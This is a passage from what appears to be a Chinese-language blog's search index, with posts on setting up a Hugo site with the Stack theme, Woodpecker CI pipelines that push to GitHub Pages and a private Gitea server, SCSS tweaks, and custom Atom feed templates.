Unsplash\n","date":"2025-03-17T10:41:26+08:00","image":"https://images.unsplash.com/photo-1629654297299-c8506221ca97?q=80\u0026w=2874\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://zonego.tw/post/linux-command/","title":"Linux Command 筆記"},{"content":"Hexo 轉到 Hugo 會想將網站改用HUGO架的最後稻草，算是npm肥大的問題\n套用 CI/CD 之後，每次自動跑編譯更是把這個弊病放大\n動不動編譯就要跑1X～2X分鐘 也有可能是我的伺服器太爛\n之前還想哪天要整理一下貼文，剛好連生成器也一起換了\n選用主題 主體就選用 stack，有些地方再自己修改\nhugo-theme-stack Card-style Hugo theme designed for bloggers 我這邊clone CaiJimmy/hugo-theme-stack-starter 來使用，省去自己安裝\nPS:\n因為用 starter 還有自行修改。所以如果主題有更新，還要另外檢查一下修改的地方有沒有跟更新衝突。\n修改的詳細步驟請看 絕對不是想水文章\nHugo 定製自己的Stack主題 Hugo Theme Stack 修改 CodeBlock Hugo 短代碼 shortcode 修改預設設定 在修改之前，由於 Hugo 的設定檔格式十分有彈性 (相對複雜)，建議修改前先稍微了解一下 除非設定檔要照抄\nHugo 設定檔結構 開啟換行自動轉 \u0026lt;br\u0026gt; 調整 markdown 處理器，將一般文字的換行符號轉 \u0026lt;br\u0026gt;\n如果沒開 (預設沒開)，相鄰的兩行會接在同一行，例如：\n\u0026lt;/\u0026gt; markdown 1 2 第一行 第二行 第一行 第二行\n修改 config/markup.toml 找到 [goldmark.renderer]\n加上 hardWraps = true，就可以了，這樣寫起文章來也比較貼近平常習慣\n\u0026lt;/\u0026gt; toml 📄 markup.toml 1 2 3 4 5 6 # Markdown renderer configuration [goldmark.renderer] unsafe = true hardWraps = true ... 設定 Google Analytics 網站分析 Hugo 官方本來就有提供設定方法，詳情請參考 hugo templates\n通常沒特殊需要，只需要用 Hugo 內建的模版就好了\n如果需要替換，在專案資料夾內新增 layouts/_internal/google_analytics.html 取代原模版\n隨附 hugo 預設模版 google_analytics.html\n在設定檔內加入 googleAnalytics 的評估 ID，就可以了\n\u0026lt;/\u0026gt; toml 📄 config/_default/hugo.toml 1 2 3 [services] [services.googleAnalytics] id = \u0026#39;G-MEASUREMENT_ID\u0026#39; 設定 rss atom feed 這邊也切成另一篇文章\nHugo 設定RSS, ATOM Feed 設定 CICD 我在用的環境之前有安裝 Drone CI 在用\n但去年覺得怎很久沒跳需要更新，才發現免費版停更了\n找了一陣子發現開源的替代方案 woodpecker，一樣是是用容器處理對應步驟\n設定檔用起來也不會差太多\n使用方法改天再來寫教學\n當然，如果你是用 github 或是 gitlab，也可以用自帶的 github workflows 這類功能就可以了\n設定自動更新主題 在 woodpecker repo 內點設定，在 cron 分頁中建好名叫 every week 的排程\n更新主題應該不用太頻繁，所以我定每週跑一次，你也可以調更頻繁\n更新步驟就照改自 stack starter 的 github workflows\n在專案資料夾下新增 .woodpecker/update-theme.yml\n\u0026lt;/\u0026gt; yaml 📄 .woodpecker/update-theme.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 when: event: cron cron: \u0026#34;every week\u0026#34; steps: - name: update theme image: hugomods/hugo:dart-sass-go-git commands: - hugo mod get -u github.com/CaiJimmy/hugo-theme-stack/v3 - name: Tidy go.mod, go.sum image: hugomods/hugo:dart-sass-go-git commands: - hugo mod tidy - name: Commit changes image: appleboy/drone-git-push settings: branch: main remote: from_secret: gitea-remote-withpass force: false commit: true commit_message: \u0026#34;CI: Update theme\u0026#34; author_name: \u0026#34;zonelin\u0026#34; author_email: \u0026#34;th5331958@gmail.com\u0026#34; hugo image 我是使用 razonyang 大大做的 docker image\n他提供了各種版本跟套件的組合，有需要可以去 https://docker.hugomods.com/choose/ 找你需要的 image\nHugo Docker Images Automated and up-to-date community Hugo Docker images, with various tags from minimalist to comprehensive, such as standard edition and extended edition, root and non-root, Git, Go, Node.js, NPM, Yarn, Dart Sass, AsciiDoc, Pandoc, Nightly build, and more. 這邊我有另外遇到一個小問題，就是我自己架的 git 是沒有開放 ssh 連線的\n所以做了一點變通，將帳號密碼合併到 remote 字串，放在 secret 裡面\n1 https://username:password@your.gitea.com/username/repository.git 至於安全性，我覺得既然都可以將 ssh private key 內容放在 secret 裡面了，帳號密碼也沒關係吧\n詳細的設定請參考 Woodpeak Git Push 至私有 git\n設定推送至 GitHub 同樣在 .woodpecker 新增流程設定檔 github.yml\n這次稍微改動，只有並到 release 分支，才會觸發執行\n\u0026lt;/\u0026gt; yaml 📄 .woodpecker/github.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 when: - event: push branch: Release steps: - name: build image: hugomods/hugo:dart-sass-go-git commands: - hugo build - cp public/post/rss.xml public/rss.xml - name: deploy git page image: appleboy/drone-git-push environment: PLUGIN_BRANCH: main PLUGIN_SSH_KEY: from_secret: github_key PLUGIN_REMOTE: \u0026#34;git@github.com:ZoneLin/blog-public.git\u0026#34; PLUGIN_AUTHOR_NAME: zoneLin PLUGIN_AUTHOR_EMAIL: th5331958@gmail.com PLUGIN_FORCE: true PLUGIN_COMMIT: true PLUGIN_COMMIT_MESSAGE: \u0026#34;Auto generated using Woodpecker CI\u0026#34; commands: - cd public - git init - /bin/drone-git-push 這次是推送到 GutHub 所以可以用 SSH key 方式推送\n我不想把網站程式碼公開出去，所以只將編譯完的 public 資料夾推到 GutHub 上\n到這邊其實 GitHub Page 差一步就可以設定好了\n到 repository 設定 \u0026gt; Pages 點 upgrade 就可以了\n備註 repository 的名稱必須是 XXX.github.io\n詳細可到 github page 官網看 https://pages.github.com/\n部署到 CloudFlare Page 請參考 Cloudflare Page 架站教學\n這邊就跟之前一樣沒作修改，流程大概如下\nCloudFlare Page 設定監看 GitHub 把編完的靜態網站檔案傳到 GitHub 後就等自動同步就好了，通常只需要幾秒\n設定搜尋引擎 Google Search Console - 讓 Google 搜尋到部落格內容 Bing Webmaster Tools - 讓 Bing 搜尋到部落格內容 套用 Google AdSense Google AdSense 讓你的網站幫你賺錢 大概就這些了 🥱\n","date":"2025-03-12T12:41:42+08:00","image":"https://zonego.tw/post/hugo/cloudflare_page_hu_476d0ddf7b76da73.png","permalink":"https://zonego.tw/post/hugo/","title":"Hugo + woodpacker CI + CloudFlare Pages 架站心得"},{"content":"Git 連線限制 最近在設定部落格的自動更新，發現自己架的 gitea 伺服器只有對外開放 https\ngit 指令內預設是走 ssh 才能使用免密碼，用 key 作身分驗證\n為了解決身分驗證的問題，花了一些時間整理解決方式\n如果你的目的是 GitHub 或 GitLab 這種不是自己架的，不會有這問題\n順便紀錄怎麼使用 drone-git-push\n1. 改用 https + 帳號密碼驗證 如果原本 gitea 就已經設定好 https 連線，這是簡單方便的方式，只要改專案的CICD設定就好了\n將 git remote 的設定字串，改成下面的格式就好了\n📄 secret-remote-string 1 https://username:password@your.gitea.com/username/repository.git 如果擔心明文會洩漏帳號密碼，可以用 woodpecker secret\n先在 woodpecker 中加入上面的 remote 字串，到專案的 secret\n再改專案中的 .woodpecker 設定檔， remote 的地方改成調用 secret\n\u0026lt;/\u0026gt; yml 1 2 3 4 5 6 7 8 steps: - name: Commit changes image: appleboy/drone-git-push settings: branch: main remote: from_secret: secret-remote-string 2. IP直連 假設已經準備好 ssh key (如果沒有，可以跳去後面看完整教學)\n預先調整網路設定，讓 woodpecker 伺服器跟 gitea 伺服器可以用 IP 直連\n例如穿透、轉發或乾脆放同網段\n改完之後，將 git remote 改成如下格式，搭配原本的 key 連線即可\n1 git@gitea-ip:username/repository.git 如果 gitea 的 ssh port 不是在預設的 22\n1 ssh://git@gitea-ip:port/username/repository.git 3. revers proxy 轉發 22 port 這個方法是第一個方法的延伸，如果有時間設定建議可以改成這樣，後面使用也比較方便\n既然 gitea 用非標準的 port，那就在 revers proxy 改回來就好了\n當然，如果你能直接改 gitea 的 port 最省事\n通常 revers proxy 會設定讓大部分內網段都能連到(至少我是這樣設定)，不用再重複設定網段穿透\n至於對不對外開放可以另外考慮，我只設定內網不同網段也可以連到\n設定方式請參考 Gitea - 自己的 Git 自己架\ndrone-git-push 使用教學 例如使用 ssh key 認證，push 到 github 上\n設定連線 SSH Key 使用指令產生公私鑰\nbash 1 ssh-keygen -f keyname 中間 -f 可以自行選擇存放的位置跟檔名\n如果沒指定 -f ，預設存在 ~/.ssh/\n完成之後會生成 keyname 跟 keyname.pub 兩個檔案\nkeyname.pub 就是公鑰\nkeyname 就是私鑰，必須要保存好\n將公鑰上傳到 github\n到 github 點右上角大頭貼 \u0026gt; settings \u0026gt; 左邊 SSH and GPG keys\n點 new SSH key， title 打方便辨識的名字，例如我就放一個 Key 是 woodpecker 專用\n將 keyname.pub 的內容貼上就完成了\n將公鑰的內容貼進去就可以了\n將私鑰內容貼到 woodpecker secret\n打開 woodpecker 到專案內點齒輪設定 \u0026gt; Secrets\n點 add secrets\nname 可以寫個方便辨識的名字\nvalue 貼上私鑰的內容 (END後面的換行要保留)\n📄 value 1 2 3 4 -----BEGIN OPENSSH PRIVATE KEY----- abcdefghi... OOXXc= -----END OPENSSH PRIVATE KEY----- Avalable Plugin 可以指定這個 secret 只有哪個步驟能用\n例如我可以填上 appleboy/drone-git-push，就只有 image 用到 drone-git-push 這些步驟能用\n留空白代表不限制\nAvalable at following event 可以指定在哪些 git 或 woodpecker 操作可以使用這個 secret\n這邊的 git 操作指的是你的操作觸發 woodpecker，而不是 drone-git-push 內的動作\nwoodpecker 設定檔 照前面設定把 Key 跟 secret 設定好之後，就可以在流程內加步驟了\n\u0026lt;/\u0026gt; yml 1 2 3 4 5 6 7 8 9 10 11 - name: push git image: appleboy/drone-git-push environment: PLUGIN_BRANCH: main PLUGIN_SSH_KEY: from_secret: github_key PLUGIN_REMOTE: \u0026#34;git@github.com:user/repo.git\u0026#34; PLUGIN_AUTHOR_NAME: user PLUGIN_AUTHOR_EMAIL: email PLUGIN_COMMIT: true PLUGIN_COMMIT_MESSAGE: \u0026#34;Auto generated using Woodpecker CI\u0026#34; 上面寫的是基本用法\n如果除了 git push 的指令還需要跑別的東西，可以用 commands\n例如，我的編譯跑完之後，我只想推送編譯完的檔案出去，而不是專案原始碼\n先 cd 進到編譯完的 public 資料夾 初始化儲存庫 強制推送至 github \u0026lt;/\u0026gt; yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 - name: deploy git page image: appleboy/drone-git-push environment: PLUGIN_BRANCH: main PLUGIN_SSH_KEY: from_secret: github_key PLUGIN_REMOTE: \u0026#34;git@github.com:ZoneLin/blog-public.git\u0026#34; PLUGIN_AUTHOR_NAME: zoneLin PLUGIN_AUTHOR_EMAIL: th5331958@gmail.com PLUGIN_FORCE: true PLUGIN_COMMIT: true PLUGIN_COMMIT_MESSAGE: \u0026#34;Auto generated using Woodpecker CI\u0026#34; commands: - cd public - git init - /bin/drone-git-push 隨副 drone-git-push 用法參考\nhttps://woodpecker-ci.org/plugins/Git%20Push\n參考來源 处理git clone命令的非标准SSH端口连接 stackoverflow Photo by Yancy Min on Unsplash\n","date":"2025-03-11T13:07:50+08:00","image":"https://images.unsplash.com/photo-1556075798-4825dfaaf498?q=80\u0026w=2952\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://zonego.tw/post/woodpeak-git-push/","title":"Woodpeak Git Push 至私有 git"},{"content":" hugo-theme-stack Card-style Hugo theme designed for bloggers SCSS hugo-theme-stack 這個主題採用 SCSS 作為寫 CSS 的語言\n使用上也不會太困難，用大括號區分選擇器，使用分號區分屬性，寫起來蠻接近原本的 CSS\n巢狀結構 (Nesting) SCSS 支援在搜尋標籤下再次用搜尋，相下面的例子可以更清楚知道像 .title.name 的對應關係\n\u0026lt;/\u0026gt; scss 1 2 3 4 5 6 7 8 9 10 11 .title { color: rgb(0, 0, 0); .name { color: rgb(0, 255, 0); } span { color: rgb(255, 0, 0); } } 編譯完之後會變成\n\u0026lt;/\u0026gt; css 1 2 3 4 5 6 7 8 9 10 11 .title { color: rgb(0, 0, 0); } .title .name { color: rgb(0, 255, 0); } .title span { color: rgb(255, 0, 0); } 變數(Variables) scss 內的變數可以紀錄多個值，單個值時可以用於計算\n\u0026lt;/\u0026gt; scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $box-margin: 10px 10px 5px 5px; $fontbase: 5pt; .box{ margin: $box-margin; h2 { font-size: $fontbase * 2; } p { font-size: $fontbase; } } 編譯完之後\n\u0026lt;/\u0026gt; css 1 2 3 4 5 6 7 8 9 10 11 .box{ margin: 10px 10px 5px 5px; } .box h2 { font-size: 10pt; } p { font-size: 5pt; } 引用 scss 支援檔案引用，例如我已經有個寫好的 sidebar.scss，在上一層就可以引用這個檔案，編譯時只生成單一個 css\n\u0026lt;/\u0026gt; scss 1 @import \u0026#34;sidebar.scss\u0026#34;; 後面就放意本站有做的修改\n更改新貼文模版 新增貼文指令，建立 my-new-post\n\u003e_ terminal 1 hugo new content post/my-new-post/index.md 依照官方文件 archetypes#lookup-order 的說明\nHugo會依序到下面四個地方找模版\narchetypes/post.md archetypes/default.md themes/my-theme/archetypes/posts.md themes/my-theme/archetypes/default.md 其中第3跟第4種，如果主題安裝是用 module 的方式，專案資料夾內不會出現\n我們可以在專案資料夾建 archetypes/post.md 取代就好\n內容用 yaml, toml 或 json 都可以，這邊以 yaml 為例\n其他格式請參考官方文件 archetypes\n\u0026lt;/\u0026gt; yaml 📄 my-project/archetypes/post.md 1 2 3 4 5 6 7 8 9 10 11 12 13 14 --- title: \u0026#34;{{ replace .File.ContentBaseName `-` ` ` | title }}\u0026#34; slug: \u0026#34;{{ .File.ContentBaseName }}\u0026#34; description: \u0026#34;\u0026#34; date: {{ .Date }} draft: true hidden: false comments: true image: categories: example tags: - example --- 這樣用指令產生新文章時，title 會替換為 my new post，slug 還是維持 my-new-post\n調整 Archives 貼文改一行兩篇\n在 my-project/assets/scss/custom.scss 新增下面程式碼\n\u0026lt;/\u0026gt; scss 📄 my-project/assets/scss/custom.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @media (min-width: 1024px) { .article-list--compact { display: grid; grid-template-columns: 1fr 1fr; background: none; box-shadow: none; gap: 1rem; article { background: var(--card-background); border: none; box-shadow: var(--shadow-l2); margin-bottom: 8px; } } } 鍵盤按鍵 \u0026lt;kbd\u0026gt; HTML 內有一個不太常用的標籤 \u0026lt;kbd\u0026gt;\u0026lt;/kbd\u0026gt; 用來表示鍵盤按鍵。markdown 沒支援生成這個標籤，不過 markdown 內可以直接寫 HTML 使用。平常雖然不太常用，但偶爾用到時還是希望它長得好看一點。\nCtrl + C\n\u0026lt;/\u0026gt; markdown 1 \u0026lt;kbd\u0026gt;Ctrl\u0026lt;/kbd\u0026gt; + \u0026lt;kbd\u0026gt;C\u0026lt;/kbd\u0026gt; 翻一下 github 發現，有專門作鍵盤案動畫的 CSS shhdharmen/keyboard-css。\n最簡單的方式可以在 my-project/layouts/partials/head/custom.html 加上引用就可以了。\n\u0026lt;/\u0026gt; html 📄 my-project/layouts/partials/head/custom.html 1 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://unpkg.com/keyboard-css@1.2.4/dist/css/main.min.css\u0026#34; /\u0026gt; 不過使用時就要指定 class 才會有效，雖然可以有很多風格可以彈性使用，但在 markdown 就要多打很多字。\n\u0026lt;/\u0026gt; markdown 1 \u0026lt;kbd class=\u0026#34;kbc-button\u0026#34;\u0026gt;Ctrl\u0026lt;/kbd\u0026gt; + \u0026lt;kbd class=\u0026#34;kbc-button\u0026#34;\u0026gt;C\u0026lt;/kbd\u0026gt; 我這邊大概只會用一種風格，所以為了以後可以少打點字，這邊還是要稍微作點修改，移植裡面按鈕(button)的版本到我的scss。\nCSS code 修改自 GitHub shhdharmen/keyboard-css\n如果不需要有夜晚模式的話，在 custom.scss 加入下面的代碼即可 (白色按鍵)\n\u0026lt;/\u0026gt; scss 📄 my-project/assets/scss/custom.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 kbd { -webkit-backface-visibility: hidden; backface-visibility: hidden; border: 1px solid #e6e6e6; border-radius: .25rem; display: inline-block; font-weight: 400; text-align: left; transform: translateZ(5px); transform-style: preserve-3d; transition: all .25s cubic-bezier(.2, 1, .2, 1); font-size: 1rem; line-height: 1.5; margin: .375rem .375rem .6875rem; padding: .375rem .75rem; box-shadow: 0 0 #d9d9d9, 0 0 #d9d9d9, 0 1px #d9d9d9, 0 2px #d9d9d9, 0 3px #d9d9d9, 0 4px #d9d9d9, 0 5px #d9d9d9, 2px 2.5px 4px #adb5bd, 0 -1px 2.5px #adb5bd; background-color: #fff; color: #343a40; cursor: pointer; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji; text-decoration: none } kbd:after { border-radius: .5rem; border-width: .125rem; bottom: -10px; left: -.3125rem; right: -.3125rem; top: 0; transform: translateZ(-5px); border-color: #ccc } kbd:focus, kbd:hover { transform: translate3d(0, 1px, 5px); box-shadow: 0 0 #d9d9d9, 0 0 #d9d9d9, 0 1px #d9d9d9, 0 2px #d9d9d9, 0 3px #d9d9d9, 0 4px #d9d9d9, 2px 2px 4px #adb5bd, 0 -1px 2px #adb5bd; background-color: #e6e6e6; color: #343a40; outline: none; text-decoration: none } kbd:focus:after, kbd:hover:after { transform: translate3d(0, -1px, -5px) } kbd:active { border-color: transparent; transform: translate3d(0, 5px, 0); background-color: #e6e6e6; box-shadow: 0 0 1px 1px #d9d9d9; color: #343a40 } kbd:active:after { transform: translate3d(0, -5px, 0) } kbd:disabled { cursor: not-allowed; opacity: .65; pointer-events: none } 如果要有夜晚模式\n新增 highlight 資料夾 my-project/assets/scss/partials/highlight/ 新增 dark.scss 跟 light.scss 取代原本主題自帶的 scss 貼上下面的內容，這些程式碼都是照搬主題原始的 scss 調整配色變數（如果你不喜歡我的配色），並引用 kbd.scss 加上 kbd.scss 放對應的 scss code \u0026lt;/\u0026gt; scss 📄 my-project/assets/scss/partials/highlight/dark.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* * Style: monokai * https://xyproto.github.io/splash/docs/monokai.html */ $color: #f8f8f2; $background-color: #272822; $error-color: #bb0064; $keyword-color: #66d9ef; $text-color: $color; $name-color: #a6e22e; $literal-color: #e6db74; // kbd colors $kbd-fontcolor: #D5FFE4; $kbd-box-shadow: #5b4f9d; $kbd-box-shadow2: #6255ab; $kbd-background-color: #6F61C0; $kbd-after-border: #011a3c; $kbd-hobver-background: #5b4f9d; @import \u0026#34;common.scss\u0026#34;; // 在這邊引用 @import \u0026#34;kbd.scss\u0026#34; \u0026lt;/\u0026gt; scss 📄 my-project/assets/scss/partials/highlight/light.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* * Style: monokailight * https://xyproto.github.io/splash/docs/monokailight.html */ $color: #272822; $background-color: #fafafa; $error-color: #960050; $keyword-color: #00a8c8; $text-color: #111111; $name-color: #75af00; $literal-color: #d88200; // kbd colors $kbd-fontcolor: #343a40; $kbd-box-shadow: #d9d9d9; $kbd-box-shadow2: #adb5bd; $kbd-background-color: #fff; $kbd-after-border: #ccc; $kbd-hobver-background: #e6e6e6; @import \u0026#34;common.scss\u0026#34;; // 在這邊引用 @import \u0026#34;kbd.scss\u0026#34; \u0026lt;/\u0026gt; scss 📄 my-project/assets/scss/partials/highlight/kbd.scss 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 kbd { -webkit-backface-visibility: hidden; backface-visibility: hidden; border: 1px solid $kbd-hobver-background; border-radius: .25rem; display: inline-block; font-weight: 400; text-align: left; transform: translateZ(5px); transform-style: preserve-3d; transition: all .25s cubic-bezier(.2, 1, .2, 1); font-size: 1rem; line-height: 1.5; margin: .375rem .375rem .6875rem; padding: .375rem .75rem; box-shadow: 0 0 $kbd-box-shadow, 0 0 $kbd-box-shadow, 0 1px $kbd-box-shadow, 0 2px $kbd-box-shadow, 0 3px $kbd-box-shadow, 0 4px $kbd-box-shadow, 0 5px $kbd-box-shadow, 2px 2.5px 4px #adb5bd, 0 -1px 2.5px #adb5bd; background-color: $kbd-background-color; color: $kbd-fontcolor; cursor: pointer; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji; text-decoration: none } kbd:after { border-radius: .5rem; border-width: .125rem; bottom: -10px; left: -.3125rem; right: -.3125rem; top: 0; transform: translateZ(-5px); border-color: $kbd-after-border } kbd:focus, kbd:hover { transform: translate3d(0, 1px, 5px); box-shadow: 0 0 $kbd-box-shadow, 0 0 $kbd-box-shadow, 0 1px $kbd-box-shadow, 0 2px $kbd-box-shadow, 0 3px $kbd-box-shadow, 0 4px $kbd-box-shadow, 2px 2px 4px $kbd-box-shadow2, 0 -1px 2px $kbd-box-shadow2; background-color: $kbd-hobver-background; color: $kbd-fontcolor; outline: none; text-decoration: none } kbd:focus:after, kbd:hover:after { transform: translate3d(0, -1px, -5px) } kbd:active { border-color: transparent; transform: translate3d(0, 5px, 0); background-color: $kbd-hobver-background; box-shadow: 0 0 1px 1px $kbd-box-shadow; color: $kbd-fontcolor } kbd:active:after { transform: translate3d(0, -5px, 0) } kbd:disabled { cursor: not-allowed; opacity: .65; pointer-events: none } 完成🎉\n參考來源 第三夏尔 | Third Shire Hugo Stack主题装修笔记 Naive Koala Hugo Stack 魔改美化 shhdharmen/keyboard-css ","date":"2025-01-06T11:39:58+08:00","image":"https://user-images.githubusercontent.com/5889006/190859441-141b5f81-8483-40d2-bd96-ebf85616a46d.png","permalink":"https://zonego.tw/post/hugo-stack-custom/","title":"Hugo 定製自己的Stack主題"},{"content":"下面會修改到 Hugo 設定，還不知道怎麼改設定檔建議先看 Hugo 設定檔 的說明\n修改RSS檔名 hugo 預設生成的RSS檔案在　localhost:1313/index.xml\n如果要取代原本的RSS檔名，可以直接改 hugo.toml\n將 outputFormats.RSS 的 baseName 改成想要的檔名\n設定檔中沒有這段的話，可以直接貼上下面的設定\n這邊只紀錄 toml 格式的設定方式，需要 yaml 或 json 格式，請參考官方文件 Custom output formats\n\u0026lt;/\u0026gt; toml 📄 hugo.toml 1 2 3 4 [outputFormats] [outputFormats.RSS] mediatype = \u0026#34;application/rss+xml\u0026#34; baseName = \u0026#34;rss\u0026#34; 這樣就可以把RSS的檔名改成 localhost:1313/rss.xml\n自定輸出類型 這種方式適合用在同時加 RSS、ATOM、JSON Feed 或其他的自訂格式\n這邊以建立 Atom feed 作為範例\n\u0026lt;/\u0026gt; toml 📄 hugo.toml 1 2 3 4 5 6 7 8 9 10 [outputs] home = [\u0026#34;HTML\u0026#34;] section = [\u0026#39;HTML\u0026#39;,\u0026#39;ATOM\u0026#39;] taxonomy = [\u0026#39;HTML\u0026#39;] term = [\u0026#39;HTML\u0026#39;] [outputFormats] [outputFormats.ATOM] mediatype = \u0026#34;application/rss+xml\u0026#34; baseName = \u0026#34;atom\u0026#34; 中間的mediatype就可以照我們的需要調整，Atom 跟 RSS 相同即可\n如果是 JSON Feed ，就可以改為 application/json\n其他內建的輸出格式可參考 Output format definitions\n需要生成 ATOM Feed 的部分，就可以在 outputs 後面加上我們自訂的 ATOM\n像我這就只需要 section 生成 ATOM Feed\n如果沒有特別設定的話，這四種類的 output 預設都是 [\u0026ldquo;HTML\u0026rdquo;,\u0026ldquo;RSS\u0026rdquo;]\n到這邊我們的 ATOM Feed 還沒設定完，還需要新增模版\n自訂RSS生成模版 建模版檔案 我們可以在 layout 資料夾內建立模版檔案，覆蓋預設的模版\n📂 Folder layouts/\n└── _default/\n├── home.atom.xml\n├── section.atom.xml\n├── taxonomy.atom.xml\n└── term.atom.xml\n如果不想細分這麼詳細，全部都是套用同一個模版，可以只新增 layouts/_default/list.atom.xml\n詳細的檔名批配機制可以參考官方文件 lookup-order/#rss-templates\n模版內容 這邊我使用 araname/atom-template-for-hugo 的模版\natom-template-for-hugo Allows Hugo to generate Atom feeds to your site \u0026lt;/\u0026gt; xml 📄 list.atom.xml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 {{- /* Deprecate site.Author.email in favor of site.Params.author.email */}} {{- $authorEmail := \u0026#34;\u0026#34; }} {{- with site.Params.author }} {{- if reflect.IsMap . }} {{- with .email }} {{- $authorEmail = . }} {{- end }} {{- end }} {{- else }} {{- with site.Author.email }} {{- $authorEmail = . }} {{- warnf \u0026#34;The author key in site configuration is deprecated. Use params.author.email instead.\u0026#34; }} {{- end }} {{- end }} {{- /* Deprecate site.Author.name in favor of site.Params.author.name */}} {{- $authorName := \u0026#34;\u0026#34; }} {{- with site.Params.author }} {{- if reflect.IsMap . }} {{- with .name }} {{- $authorName = . }} {{- end }} {{- else }} {{- $authorName = . }} {{- end }} {{- else }} {{- with site.Author.name }} {{- $authorName = . }} {{- warnf \u0026#34;The author key in site configuration is deprecated. Use params.author.name instead.\u0026#34; }} {{- end }} {{- end }} {{- $pctx := . }} {{- if .IsHome }}{{ $pctx = .Site }}{{ end }} {{- $pages := slice }} {{- if or $.IsHome $.IsSection }} {{- $pages = $pctx.RegularPages }} {{- else }} {{- $pages = $pctx.Pages }} {{- end }} {{- $limit := .Site.Config.Services.RSS.Limit }} {{- if ge $limit 1 }} {{- $pages = $pages | first $limit }} {{- end }} {{- printf \u0026#34;\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; encoding=\\\u0026#34;utf-8\\\u0026#34; standalone=\\\u0026#34;yes\\\u0026#34;?\u0026gt;\u0026#34; | safeHTML }} \u0026lt;feed xmlns=\u0026#34;http://www.w3.org/2005/Atom\u0026#34; xml:lang=\u0026#34;{{ site.Language.LanguageCode }}\u0026#34;\u0026gt; \u0026lt;title\u0026gt;{{ if eq .Title .Site.Title }}{{ .Site.Title }}{{ else }}{{ with .Title }}{{ . }} on {{ end }}{{ .Site.Title }}{{ end }}\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;{{ .Permalink }}\u0026#34; /\u0026gt; \u0026lt;subtitle\u0026gt;Recent content {{ if ne .Title .Site.Title }}{{ with .Title }}in {{ . }} {{ end }}{{ end }}on {{ .Site.Title }}\u0026lt;/subtitle\u0026gt; \u0026lt;generator\u0026gt;Hugo\u0026lt;/generator\u0026gt; {{- if or $authorName $authorEmail }} \u0026lt;author\u0026gt;{{ end }}{{ with $authorName }} \u0026lt;name\u0026gt;{{ . }}\u0026lt;/name\u0026gt;{{ end }}{{ with $authorEmail }} \u0026lt;email\u0026gt;{{ . }}\u0026lt;/email\u0026gt;{{ end }}{{ if or $authorName $authorEmail }} \u0026lt;/author\u0026gt;{{ end }}{{ with .Site.Copyright }} \u0026lt;rights\u0026gt;{{ . }}\u0026lt;/rights\u0026gt;{{ end }}{{ if not .Date.IsZero }} \u0026lt;updated\u0026gt;{{ (index $pages.ByLastmod.Reverse 0).Lastmod.Format \u0026#34;2006-01-02T15:04:05-07:00\u0026#34; | safeHTML }}\u0026lt;/updated\u0026gt;{{ end }} {{- with .OutputFormats.Get \u0026#34;Atom\u0026#34; }} {{ printf \u0026#34;\u0026lt;link href=%q rel=\\\u0026#34;self\\\u0026#34; type=%q /\u0026gt;\u0026#34; .Permalink .MediaType | safeHTML }} {{- end }} \u0026lt;id\u0026gt;{{ .Permalink }}\u0026lt;/id\u0026gt; {{- range $pages }} \u0026lt;entry\u0026gt; \u0026lt;title\u0026gt;{{ .Title }}\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;{{ .Permalink }}\u0026#34; /\u0026gt; \u0026lt;published\u0026gt;{{ .PublishDate.Format \u0026#34;2006-01-02T15:04:05-07:00\u0026#34; | safeHTML }}\u0026lt;/published\u0026gt; \u0026lt;updated\u0026gt;{{ .Lastmod.Format \u0026#34;2006-01-02T15:04:05-07:00\u0026#34; | safeHTML }}\u0026lt;/updated\u0026gt; {{- if or $authorName $authorEmail }} \u0026lt;author\u0026gt;{{ end }}{{ with $authorName }} \u0026lt;name\u0026gt;{{ . }}\u0026lt;/name\u0026gt;{{ end }}{{ with $authorEmail }} \u0026lt;email\u0026gt;{{ . }}\u0026lt;/email\u0026gt;{{ end }}{{ if or $authorName $authorEmail }} \u0026lt;/author\u0026gt;{{ end }} \u0026lt;id\u0026gt;{{ .Permalink }}\u0026lt;/id\u0026gt; \u0026lt;content type=\u0026#34;html\u0026#34;\u0026gt;{{ .Content | transform.XMLEscape | safeHTML }}\u0026lt;/content\u0026gt; \u0026lt;/entry\u0026gt; {{- end }} \u0026lt;/feed\u0026gt; 完成之後，Hugo 就會幫我們生成對應的 atom.xml 檔了\n修改檔案位置 